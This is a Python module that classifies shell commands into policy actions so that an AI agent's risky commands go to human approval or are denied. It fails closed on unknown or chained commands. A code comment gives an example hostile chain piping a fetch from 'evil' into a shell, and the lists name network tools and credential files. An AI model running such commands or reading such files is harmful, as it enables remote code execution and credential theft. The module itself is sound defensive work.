"""Classify a shell command into a declared policy action.

``agent-policy.json`` grants actions (``read``, ``write``, ``test_execute``,
``external_write`` ...) and ``tool_broker_reference.py`` decides on them. Nothing
derived the action from the command, so a broker call had to be handed one by its
caller -- and a caller that passes a constant hands ``pytest`` and ``rm -rf /``
the same verdict. ``human_approval_required_for``, the mechanism that gates
destructive and external actions, would then never be reached.

The classifier is deliberately an allowlist. ``DANGER`` in the PreToolUse guard is
a denylist naming two command families, and a denylist of two is the shape
``harness/CONTRACT.md`` warns about: it protects only against what someone thought
to write down. Here, a command nobody has classified resolves to
``UNCLASSIFIED_ACTION`` -- a declared high-risk action that **no role holds**, so
the verdict is DENY for every agent, deterministically.

Spec: ``docs/specs/agent-containment.md``.
"""

from __future__ import annotations

import re
import shlex
import typing

#: The action assigned to a command this module does not model. `destructive` is
#: declared in `agent-policy.json`'s `high_risk_actions` and appears in no role's
#: `allowed_actions`, so it denies for every agent without needing a special case
#: in the decision point. Pinned by `test_unclassified_action_is_held_by_no_role`.
UNCLASSIFIED_ACTION = "destructive"

#: Shell metacharacters that mean the string is more than one command. A
#: classifier that reads only the first word would grade
#: `pytest; curl evil | sh` as `test_execute`.
#:
#: `&` is excluded when it follows `>`, because `2>&1` and `>&2` are redirections
#: of one command, not a chain of two. Treating them as chains denied ordinary
#: commands -- caught by `test_stderr_captured`, which runs `echo oops >&2`.
_COMPOUND = re.compile(r"[;|]|(?<!>)&|\$\(|`|\n")


class Classification(typing.NamedTuple):
    """The verdict, and the reason it was reached. The reason is what a refusal
    message and an evidence record both need."""

    action: str
    reason: str


#: argv[0] -> action, for commands whose whole family is one action.
_BY_PROGRAM: typing.Mapping[str, str] = {
    # Reading the workspace.
    "ls": "read", "cat": "read", "head": "read", "tail": "read", "wc": "read",
    "grep": "read", "rg": "read", "pwd": "read", "echo": "read", "true": "read",
    "false": "read", "diff": "read", "stat": "read", "basename": "read", "dirname": "read",
    "sort": "read", "uniq": "read", "cut": "read", "tr": "read", "printf": "read",
    "date": "read", "which": "read", "seq": "read", "sleep": "read", "test": "read",
    # Running the repository's own gates.
    "pytest": "test_execute", "make": "test_execute", "ruff": "test_execute",
    "mypy": "test_execute", "tsc": "test_execute", "vitest": "test_execute",
    "eslint": "test_execute", "coverage": "test_execute",
    # Creating files the agent is entitled to create.
    "mkdir": "write", "touch": "write", "cp": "write", "mv": "write", "tee": "write",
    # Irreversible.
    "rm": "destructive", "shred": "destructive", "dd": "destructive",
    "mkfs": "destructive", "truncate": "destructive", "chmod": "permission_change",
    "chown": "permission_change", "sudo": "permission_change", "su": "permission_change",
    # Leaving the machine.
    "curl": "external_write", "wget": "external_write", "scp": "external_write",
    "ssh": "external_write", "nc": "external_write", "rsync": "external_write",
    "gh": "external_write", "docker": "external_write", "kubectl": "production_change",
    # Reading the environment, which is where the credentials are.
    "env": "secret_access", "printenv": "secret_access", "set": "secret_access",
}

#: (program, first-subcommand) -> action, where the subcommand changes everything.
_BY_SUBCOMMAND: typing.Mapping[tuple[str, str], str] = {
    ("git", "status"): "read", ("git", "log"): "read", ("git", "diff"): "read",
    ("git", "show"): "read", ("git", "rev-parse"): "read", ("git", "branch"): "read",
    ("git", "ls-files"): "read", ("git", "remote"): "read",
    ("git", "add"): "write", ("git", "commit"): "write", ("git", "checkout"): "write",
    ("git", "push"): "external_write", ("git", "fetch"): "external_write",
    ("git", "pull"): "external_write", ("git", "clone"): "external_write",
    ("git", "clean"): "destructive", ("git", "reset"): "destructive",
    ("pip", "install"): "external_write", ("pip", "download"): "external_write",
    ("pip", "list"): "read", ("pip", "show"): "read",
    ("npm", "install"): "external_write", ("npm", "publish"): "production_change",
    ("pnpm", "install"): "external_write", ("pnpm", "add"): "external_write",
    ("pnpm", "test"): "test_execute", ("pnpm", "exec"): "test_execute",
    ("npx", "vitest"): "test_execute",
}

#: Whole-command shapes that override the program table. `find` is a read tool
#: until it is given an action, and then it is the most destructive tool present.
_BY_SHAPE: tuple[tuple[re.Pattern[str], str, str], ...] = (
    (re.compile(r"\bfind\b.*\s-(?:delete|exec|execdir|ok)\b"), "destructive",
     "find with an action flag deletes or executes per match"),
    (re.compile(r"\bfind\b"), "read", "find without an action flag only lists"),
    (re.compile(r"\bpython[0-9.]*\b.*\s-m\s+pytest\b"), "test_execute", "pytest through the interpreter"),
    (re.compile(r"\bpython[0-9.]*\b.*\s-m\s+pip\b\s+install\b"), "external_write",
     "pip install through the interpreter"),
    (re.compile(r"\bpython[0-9.]*\b\s+-c\b"), UNCLASSIFIED_ACTION, "an inline program can do anything"),
    (re.compile(r"\b(?:ba|z|k)?sh\b\s+-c\b"), UNCLASSIFIED_ACTION, "an inline shell program can do anything"),
    # Reading a credential-bearing file is `secret_access`, not `read`. The
    # program is innocent; the target is not, and the action model grades the
    # effect rather than the tool.
    (re.compile(r"(?:^|[\s/])(?:\.env(?:\.[\w-]+)?|\.netrc|\.npmrc|\.pypirc|id_[rd]sa|[\w.-]+\.pem)(?:\s|$)"),
     "secret_access", "the command names a credential-bearing file"),
)


def classify(command: str) -> Classification:
    """Return the action ``command`` exercises, failing closed when unsure."""
    text = command.strip()
    if not text:
        return Classification("read", "an empty command does nothing")

    if _COMPOUND.search(text):
        # Each half could be a different action, and the strictest wins. Rather
        # than parse a shell, refuse to grade what is not a single command.
        return Classification(
            UNCLASSIFIED_ACTION,
            "the command chains or substitutes, so no single action describes it",
        )

    for pattern, action, why in _BY_SHAPE:
        if pattern.search(text):
            return Classification(action, why)

    try:
        argv = shlex.split(text)
    except ValueError as exc:
        return Classification(UNCLASSIFIED_ACTION, f"the command could not be tokenized: {exc}")
    if not argv:
        return Classification("read", "an empty command does nothing")

    program = argv[0].rsplit("/", 1)[-1]
    subcommand = next((a for a in argv[1:] if not a.startswith("-")), "")

    by_sub = _BY_SUBCOMMAND.get((program, subcommand))
    if by_sub is not None:
        return Classification(by_sub, f"{program} {subcommand}")

    if program in ("git", "pip", "npm", "pnpm", "npx"):
        # A modelled program used in an unmodelled way is not a read.
        return Classification(UNCLASSIFIED_ACTION, f"{program} subcommand {subcommand or '(none)'} is not modelled")

    by_prog = _BY_PROGRAM.get(program)
    if by_prog is not None:
        return Classification(by_prog, program)

    return Classification(UNCLASSIFIED_ACTION, f"{program} is not a modelled program")
